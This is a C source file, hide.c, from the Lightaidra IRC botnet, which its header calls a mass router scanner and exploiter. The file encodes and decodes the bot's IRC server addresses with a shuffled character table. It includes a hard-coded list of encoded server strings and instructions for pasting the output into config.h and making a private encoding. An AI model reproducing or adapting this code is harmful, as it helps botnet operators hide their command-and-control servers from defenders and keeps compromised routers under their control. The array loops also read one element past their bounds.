/*
 * hide.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) Federico Fazzi, <federico@ahacktivia.org>.
 *
 * example: ./hide -encode "127.0.0.1:6667"
 *          ./hide -decode ">@.C<C<C>U,,,." <- copy into config.h
 * CHANGE THE POSITION OF ENCODES[] VALUES IF YOU WANT YOUR PRIVATE ENCODING. 
 */

#include <stdio.h>
#include <string.h>

char *servers[] = {             // List the servers in that format, always end in (void*)0
        ">-:y-@y@<<y>.;",
        ">@.y<y<y>",
	">@.y<y<y@",
        (void*)0
};
char *server;
int numservers=3;
char s_copy[512];
int encirc =1;



/*
char encodes[] = { 
	'<', '>', '@', '_', ';', ':', ',', '.', '-', '+', '*', '^', '?', '=', ')', '(', 
	'|', 's', 'q', '&', 'o', '$', '3', '"', '7', 'K', 'k', 'C', 'x', 'F', 'v', 'u', 
	't', 'A', 'r', 'B', 'p', '%', 'n', 'm', 'l', 'i', 'h', 'g', 'f', 'e', '6', 'c', 
	'b', 'a', '~', '1', '2', 'D', '4', '5', 'd', '!', '8', '9', 'z', 'U', 'y', 'w'
};
char decodes[] = { 
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
	'g', 'h', 'i', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'z', 'y', 
	'w', 'k', 'x', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'L', 'M', 'N', 'O', 
	'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'Z', 'Y', 'W', 'K', 'X', '|', ':', '.', ' '
};
*/
char encodes[] = { 
	'x', 'm', '@', '_', ';', 'w', ',', 'B', '-', 'Z', '*', 'j', '?', 'n', 'v', 'E', 
	'|', 's', 'q', '1', 'o', '$', '3', '"', '7', 'z', 'K', 'C', '<', 'F', ')', 'u', 
	't', 'A', 'r', '.', 'p', '%', '=', '>', '4', 'i', 'h', 'g', 'f', 'e', '6', 'c', 
	'b', 'a', '~', '&', '5', 'D', 'k', '2', 'd', '!', '8', '+', '9', 'U', 'y', ':'
	
};
char decodes[] = { 
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
	'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
	'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '.', ' '
};
char encoded[512], decoded[512];

void encode(char *str)
{
	int x = 0, i = 0, c;

	memset(encoded, 0, sizeof(encoded));
	while(x < strlen(str))
	{
		for(c = 0; c <= sizeof(decodes); c++)
		{
			if(str[x] == decodes[c])
			{
				encoded[i] = encodes[c];
				i++;
			}
		}
		x++;
	}
	encoded[i] = '\0';

	return;
}

void decode(char *str)
{
	int x = 0, i = 0, c;

	memset(decoded, 0, sizeof(decoded));
	while(x < strlen(str))
	{
		for(c = 0; c <= sizeof(encodes); c++)
		{
			if(str[x] == encodes[c])
			{
				decoded[i] = decodes[c];
				i++;
			}
		}
		x++;
	}
	decoded[i] = '\0';

	return;
}

int hide_main(int argc, char *argv[])



{
	if(argv[1] == 0 || argv[2] == 0)
	{
		printf("./lighthide [-encode|-decode] [string]\n");
		return(1);
	}
	else if(!strncmp(argv[1], "-encode", 7))
	{
		encode(argv[2]);
		decode(encoded);
		printf("encoded[%s]:\n%s\n", decoded, encoded);
	}
	else if(!strncmp(argv[1], "-decode", 7))
	{
		decode(argv[2]);
		encode(decoded);
		printf("decoded[%s]:\n%s\n", argv[2], decoded);
	}

	 else if(!strncmp(argv[1], "-test", 7))
        {
		server=servers[rand()%numservers];
	if (encirc != 0){
                decode(server);
                encode(decoded);
		strncpy(s_copy, decoded, sizeof(s_copy));
                printf("decoded[%s]:\n%s\n", argv[2], s_copy);}
        }

	return(0);
}
